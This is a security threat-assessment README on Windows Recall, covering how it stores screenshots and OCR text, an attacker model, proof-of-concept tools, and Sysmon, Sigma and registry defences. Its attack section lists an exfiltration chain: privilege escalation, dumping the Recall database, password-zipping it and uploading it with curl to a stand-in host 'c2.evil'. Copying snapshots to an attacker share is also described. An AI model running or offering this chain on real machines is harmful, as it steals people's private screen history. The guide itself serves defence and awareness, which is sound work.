Windows Recall Threat Assessment & PoC Guide

> **Version:** 1.3 | **Date:** 2025‑04‑25 | **Author:** <Neo / @HaittaNeo>

---

## Why You Should Care 🧐 *(Two‑minute version)*
**Recall** is a Windows 11 feature that screenshots your display **every three seconds**, runs OCR/AI over each image, and files the results into a searchable database on your PC. Great for finding that recipe you skimmed yesterday… but also a **gold‑mine** for hackers, insiders, or abusive partners.  

> *Picture a CCTV camera pointed at your monitor 24 × 7—with the recordings sitting in an unlocked filing cabinet whenever you’re logged in.*

This repo explains *how* Recall works, *demonstrates* remote data‑theft with public tools, and offers practical defenses.  Hardcore defenders get packet captures and Sigma rules; casual readers get plain‑English call‑outs 🔹.

---

## Table of Contents
1. [Quick Primer (non‑tech)](#quick-primer-non-tech)
2. [Deep‑Dive Internals](#deep-dive-internals)
3. [Adversary Model](#adversary-model)
4. [Attack Pathways](#attack-pathways)
5. [Proof‑of‑Concept Toolkit](#proof-of-concept-toolkit)
6. [Detection & Hardening](#detection--hardening)
7. [Appendices](#appendices)
8. [References](#references)

---

## Quick Primer (non‑tech)
| 🔍 What Recall Does | 💥 Why It’s Risky |
|--------------------|------------------|
| Takes a picture of your screen every 3 s. | Passwords, private chats, health info—captured automatically. |
| Uses AI to let you search “the slide with the blue pie chart.” | Attackers steal **one file** instead of hunting all over the disk. |
| Stores everything *locally* and claims it’s encrypted. | Encryption unlocks once you log in; malware can read plaintext. |

Skip ahead for deep tech, or watch for the **Plain‑English** boxes 🔹 that summarize each section.

---

## Deep‑Dive Internals
<details><summary>Plain‑English 🔹</summary>
The next bits map Recall’s plumbing—what DLL grabs each screenshot, where files live, and why the “encryption” isn’t much protection.  If diagrams glaze your eyes, jump to [Attack Pathways](#attack-pathways).</details>

### 2.1 Component Diagram
```
┌──────────────────────────────┐
│  User Session (explorer.exe) │   ← You, logged in
└────────────┬─────────────────┘
             │ 3‑sec timer
┌────────────▼────────────┐     ┌────────────────────────────┐
│  CaptureService.dll     │──▶──│  CoreAIPlatformHost.exe    │
│  grabs pixels           │     │  OCR + vision embeddings   │
└────────────┬────────────┘     └───────────┬────────────────┘
             │ writes .avif                 │ writes JSON
             ▼                             ▼
 %LOCALAPPDATA%\CoreAIPlatform\UKP\Recall\V1\
  ├─ ScreenGrabs\YYYY‑MM‑DD‑hh‑mm‑ss‑###.avif
  └─ Recall.db (SQLite 3.24, WAL)
```

### 2.2 Data Flow
1. Win32 `BitBlt` → AVIF (≈170–220 KB).
2. **Metadata:** HWND title, PID, monitor ID inserted into `Snapshot` table.
3. **OCR:** Tesseract build drops plaintext into `OcrText(snapshot_id, text)`.
4. **Vision embeddings:** 512‑D float32 vector in `VisionEmbedding` enables semantic search.

> **Plain‑English 🔹**  
> Imagine a giant spreadsheet listing every screenshot, window name, words it saw, and even an AI guess like “bank statement.”  That sheet is **not** password‑protected once you’re logged in.

### 2.3 Snapshot Retention & Crypto
| Layer | How Microsoft “secures” it | Weakness |
|-------|----------------------------|----------|
| Disk | AVIF blobs AES‑256‑CBC‑wrapped with per‑user DPAPI‑NG key. | Key auto‑unlocks on login; attacker copies plaintext via user context. |
| DB | Unencrypted SQLite; temp files in `AppData\Local\Temp`. | OCR text / embeddings readable by any process with user or SYSTEM rights. |
| Policy | `DisableSnapshots` GPO or Settings toggle. | Home SKU ignores domain GPO; user can re‑enable.

---

## Adversary Model
<details><summary>Plain‑English 🔹</summary>
We assume the attacker tricks you into running *something* (phishing) and uses a Windows bug to become admin. Unfortunately those two steps happen daily.</details>

| Capability | Required? | Real‑world note |
|------------|-----------|-----------------|
| Remote Code‑Exec (user) | **Yes** | Phishing doc, malvertising MSI, LNK ISO bundle. |
| Local Priv‑Esc (admin) | **Yes** | Public CVE‑2025‑29824 (CLFS) still hits un‑patched hosts. |
| Network pivot | No | Recall loot is local—no AD creds needed. |
| Physical access | No | Out‑of‑scope; remote only. |

---

## Attack Pathways

### 4.1 End‑to‑End Remote → Exfil Chain
```text
1. phishing.doc  →  loader.exe (user)              # initial foothold
2. clfs_exp.exe  →  SYSTEM shell                  # CVE‑2025‑29824
3. git clone https://github.com/xaitax/TotalRecall
4. python total_recall.py --export csv --out %TEMP%\dump
5. 7z a -m0=lzma2 -pS3cr3t %TEMP%\recall.7z %TEMP%\dump
6. curl -F file=@%TEMP%\recall.7z https://c2.evil/cloud
```
*Total dwell time: ≈ 180 s on NVMe hardware.*

### 4.2 Local Lateral Movement (optional)
1. SYSTEM shell adds `Everyone:R` on Recall folder via `icacls`.  
2. Copies snapshots to attacker‑controlled SMB share in real time.

---

## Proof‑of‑Concept Toolkit
| Tool | Language | Quick Run | Notes |
|------|----------|-----------|-------|
| **TotalRecall** | Python 3 | `python total_recall.py --json .` | Dumps images + OCR, seconds. |
| **totalrecall‑go** | Go 1.21 | `totalrecall-go -watch | jq .` | Streams snapshots live; pipe to C2. |
| **RecallLiveDump.ps1** | PowerShell | `.\RecallLiveDump.ps1 -ElasticHost elk.lab` | For blue‑team lab visibility. |

> **Plain‑English 🔹**  
> These scripts act like automated thieves.  Only run them on test machines you own!

---

## Detection & Hardening
### 6.1 Sysmon Example
```xml
<FileCreateTime onmatch="include">
  <TargetFilename condition="contains">\CoreAIPlatform\UKP\Recall\V1\</TargetFilename>
</FileCreateTime>
```
### 6.2 Sigma Rule (SQLite read)
```yaml
detection:
  selection:
    TargetFilename|contains: "\\Recall\\V1\\Recall.db"
    EventID: 11  # FileCreate or FileAccess depending on EVTX->Sysmon mapping
  condition: selection and not (Image|startswith: "C:\\Windows\\System32\\")
```
### 6.3 Mitigation Checklist
1. **Disable Recall**  
   ```powershell
   New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Recall' -Name DisableSnapshots -Type DWord -Value 1 -Force
   gpupdate /force
   ```
2. **Intune CSP** `./Device/Vendor/MSFT/Policy/Config/Recall/DisableSnapshots = 1`.
3. **Patch LPE bugs** (CLFS, PrintNightmare‑class) immediately.
4. **EDR block/alert** on non‑Microsoft processes touching `Recall.db`.
5. **Full‑disk encryption** to suppress cold‑boot/theft forensics.

---

## Appendices
### A. Registry & GPO Cheatsheet
| Setting | Path | Value |
|---------|------|-------|
| Disable Snapshots | `HKLM\SOFTWARE\Policies\Microsoft\Windows\Recall` | `DisableSnapshots = 1` (DWORD) |
| Max Retention Days | *undocumented* | Rumoured `MaxDays`; not yet honored. |

### B. Sigma / YARA
* `sigma/recall_db_access.yml` – see §6.2.  
* `yara/recall_avif.yar` – matches AVIF header + EXIF tag `WRecall`.

---

## References
1. Dan Goodin, *“That groan you hear is users’ reaction to Recall going back into Windows,”* **Ars Technica**, 11 Apr 2025.  
2. Alex Hagenah, **TotalRecall**, GitHub <https://github.com/xaitax/TotalRecall>.  
3. Hazcod, **totalrecall‑go**, GitHub <https://github.com/hazcod/totalrecall>.  
4. James Forshaw, *“Windows Recall privilege escalation,”* Project Zero blog, 08 Jun 2024.  
5. Microsoft, *“Announcing Windows 11 Insider Preview Build 26100.3902,”* Windows Blogs, 10 Apr 2025.  
6. CVE‑2025‑29824, *Containerised Local File System (CLFS) elevation of privilege,* NVD entry.  

---
*Report generated 25 Apr 2025.*

